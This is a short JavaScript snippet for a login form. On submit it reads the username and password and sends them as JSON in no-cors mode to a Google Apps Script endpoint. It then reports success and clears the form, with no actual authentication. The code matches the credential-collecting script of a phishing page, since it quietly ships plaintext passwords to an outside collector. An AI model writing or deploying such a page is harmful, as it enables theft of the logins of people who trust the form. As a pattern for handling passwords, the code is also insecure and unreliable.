 document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const data = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
      };

      fetch("https://script.google.com/macros/s/AKfycbyLMBANZynflTbX_HoZt72btFV7-9KJLaBqLclFTJAAlv2RJlhyQrX9IF-LnwyGYvpT/exec", {
        method: "POST",
        mode: "no-cors",  // Required for Apps Script without CORS headers
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
      .then(() => {
        alert("Login submitted successfully!");
        document.getElementById("loginForm").reset();
      })
      .catch(error => {
        alert("Error submitting login!");
        console.error(error);
      });
    });